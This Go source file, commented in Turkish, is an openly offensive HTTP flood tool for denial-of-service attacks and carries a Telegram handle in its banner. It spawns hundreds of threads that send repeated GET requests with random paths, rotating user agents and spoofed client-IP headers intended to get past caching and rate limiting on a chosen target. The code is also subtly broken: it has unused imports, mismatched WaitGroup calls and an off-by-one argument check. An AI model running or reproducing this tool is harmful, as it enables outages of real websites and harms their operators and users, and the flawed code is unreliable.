package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ============================================================
// KONFIGÜRASYON
// ============================================================
var (
	hedefUrl    string
	threadSayisi int
	sure        int
	aktif       bool = true
	sayac       int64
	mutex       sync.Mutex
	wg          sync.WaitGroup
)

// ============================================================
// RASTGELE USER-AGENT
// ============================================================
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
	"Mozilla/5.0 (Android 14; Mobile) AppleWebKit/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edge/120.0.0.0",
}

// ============================================================
// RASTGELE IP
// ============================================================
func rastgeleIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
	)
}

// ============================================================
// RASTGELE PATH
// ============================================================
func rastgelePath() string {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	length := rand.Intn(10) + 5
	b := make([]byte, length)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return "/" + string(b)
}

// ============================================================
// HTTP BYPASS SALDIRISI
// ============================================================
func httpBypass(hedef string, port string, isSSL bool) {
	defer wg.Done()

	// Hedefi çözümle
	host := hedef
	if strings.Contains(hedef, ":") {
		host = strings.Split(hedef, ":")[0]
	}

	// Sahte başlıklar
	fakeIP := rastgeleIP()
	ua := userAgents[rand.Intn(len(userAgents))]
	path := rastgelePath()

	// HTTP isteği oluştur
	var conn net.Conn
	var err error

	if isSSL {
		cfg := &tls.Config{
			InsecureSkipVerify: true,
			ServerName:         host,
		}
		conn, err = tls.Dial("tcp", hedef+":"+port, cfg)
	} else {
		conn, err = net.Dial("tcp", hedef+":"+port)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	// Bypass payload
	payload := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: tr-TR,tr;q=0.9,en;q=0.8\r\n"+
			"Accept-Encoding: gzip, deflate, br\r\n"+
			"Cache-Control: no-cache\r\n"+
			"Pragma: no-cache\r\n"+
			"X-Forwarded-For: %s\r\n"+
			"X-Real-IP: %s\r\n"+
			"CF-Connecting-IP: %s\r\n"+
			"X-Originating-IP: %s\r\n"+
			"X-Client-IP: %s\r\n"+
			"True-Client-IP: %s\r\n"+
			"Connection: keep-alive\r\n\r\n",
		path, hedef, ua, fakeIP, fakeIP, fakeIP, fakeIP, fakeIP, fakeIP,
	)

	// 5 kez gönder
	for i := 0; i < 5; i++ {
		conn.Write([]byte(payload))
	}

	mutex.Lock()
	sayac += 5
	mutex.Unlock()
}

// ============================================================
// THREAD YÖNETİCİ
// ============================================================
func saldiriBaslat(hedef string, port string, threadSayisi int, sure int) {
	isSSL := port == "443"

	fmt.Printf("\n[+] Hedef: %s:%s\n", hedef, port)
	fmt.Printf("[+] Thread: %d\n", threadSayisi)
	fmt.Printf("[+] Süre: %d saniye\n", sure)
	fmt.Printf("[+] SSL: %v\n", isSSL)
	fmt.Println("[+] Saldırı başladı! CTRL+C ile durdur.\n")

	// Zamanlayıcı
	go func() {
		time.Sleep(time.Duration(sure) * time.Second)
		aktif = false
		fmt.Println("\n[!] Süre doldu, durduruluyor...")
	}()

	// Thread'leri başlat
	for i := 0; i < threadSayisi; i++ {
		wg.Add(1)
		go func() {
			for aktif {
				httpBypass(hedef, port, isSSL)
				time.Sleep(time.Microsecond * 100)
			}
		}()
	}

	// İstatistik
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for range ticker.C {
			if !aktif {
				return
			}
			mutex.Lock()
			toplam := sayac
			mutex.Unlock()
			fmt.Printf("[+] Toplam istek: %d\n", toplam)
		}
	}()

	wg.Wait()
	fmt.Println("[+] Saldırı tamamlandı.")
}

// ============================================================
// ANA FONKSİYON
// ============================================================
func main() {
	rand.Seed(time.Now().UnixNano())

	fmt.Println(`
╔═══════════════════════════════════════╗
║   HTTP BYPASS DDoS - Golang          ║
║   Telegram: @Zeldyy_here             ║
╚═══════════════════════════════════════╝
`)

	if len(os.Args) < 4 {
		fmt.Println("Kullanım: ./dos <hedef> <port> <thread> <süre>")
		fmt.Println("Örnek: ./dos example.com 80 500 60")
		fmt.Println("Örnek: ./dos example.com 443 1000 120")
		os.Exit(1)
	}

	hedef := os.Args[1]
	port := os.Args[2]
	thread, _ := strconv.Atoi(os.Args[3])
	sure, _ := strconv.Atoi(os.Args[4])

	// Hedefi temizle
	hedef = strings.ReplaceAll(hedef, "http://", "")
	hedef = strings.ReplaceAll(hedef, "https://", "")
	hedef = strings.Split(hedef, "/")[0]

	if thread < 1 {
		thread = 100
	}
	if sure < 1 {
		sure = 60
	}

	saldiriBaslat(hedef, port, thread, sure)
}
